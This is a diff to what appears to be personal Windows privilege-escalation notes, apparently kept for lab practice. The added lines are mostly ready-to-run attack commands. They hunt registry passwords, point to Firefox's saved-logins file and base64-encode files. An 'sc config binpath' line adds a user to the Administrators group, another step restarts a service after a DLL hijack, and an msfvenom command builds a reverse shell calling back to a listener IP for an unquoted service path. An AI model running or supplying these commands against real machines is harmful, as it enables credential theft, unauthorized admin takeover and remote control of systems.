@@ -67,14 +67,24 @@ netsh firewall show config
 ```
 reg query HKLM /f password /t REG_SZ /s
 ```
-
+ 
 # Search
-
+`/R C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default logins.json`
 ```
 where /R c:\windows bash # search for bash in windows
 find
+cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata # find files owned by user chase
+
+gci -recurse . | select fullname # list all files recursively 
+
+
 # flags
 /R # recursive 
+```
+
+# Turn file into base64
+```
+[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))
 ```
 
 # Running commands as another user
@@ -217,6 +227,11 @@ sc start filepermsvc
 #  Weak Service Permissions
 
 If the group “Authenticated users” has **SERVICE_ALL_ACCESS** in a service, then it can modify the binary that is being executed by the service.
+check for it by using
+```
+cmd.exe /c "sc qc UsoSvc" # powershell
+sc qc UsoSvc # cmd
+```
 
 ![[Pasted image 20230112223213.png]]
 
@@ -256,6 +271,35 @@ PowerUp has detected a potential DLL hijacking vulnerability.
 And we can use Write-HijackDll function using PowerUp
 
 `Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'`
+then restart the service
+```
+sc stop <service>
+sc start <service>
+```
+
+# Binary paths
+
+![[Pasted image 20230119015514.png]]
+If user has permission to change service config attacker can inject malicious code inside the path 
+
+```
+sc config daclsvc binpath= "net localgroup administrators user /add"
+# add the user user to administrators
+sc start daclsvc
+```
+
+## Unquoted service path
+when a service image path has spaces in it's name and not secured using quotes  attackers can inject malicious program that is named similar to the service path and will get executed when service is started 
+
+Example:
+![[Pasted image 20230119020013.png]]
+In this example program unqotedpathservice.exe Image path isn't quoted if attacker has write permision in any of the directories path to the program he can leverage it 
+creating a reverse shell with the name common and will place it inside `\Unqouted Path Service`
+```
+msfvenom  -e x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.17.185 LPORT=1337 -f exe -o Common.exe
+```
+
+
 
 
 
